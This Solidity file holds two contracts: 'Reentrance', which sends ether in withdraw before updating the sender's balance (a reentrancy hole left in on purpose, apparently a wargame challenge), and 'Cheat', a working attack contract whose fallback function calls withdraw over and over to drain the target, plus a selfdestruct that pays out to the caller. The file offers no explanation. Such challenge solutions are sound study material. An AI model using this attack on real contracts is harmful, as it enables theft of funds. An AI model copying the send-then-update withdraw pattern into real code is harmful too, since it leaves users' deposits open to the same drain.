pragma solidity ^0.4.18;

contract Reentrance {

  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] += msg.value;
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      if(msg.sender.call.value(_amount)()) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  function() public payable {}
}

contract Cheat{
    
    Reentrance re;
    
    function Cheat(address _target) public payable{
        re = Reentrance(_target);
    }
    
    function cheat() public{
        re.donate.value(0.1 ether)(this);
        re.withdraw(0.1 ether);
    }
    
    function() public payable{
        
        re.withdraw(0.1 ether);
        
    }
    
    function kill() public{
        selfdestruct(msg.sender);
    }
    
    
}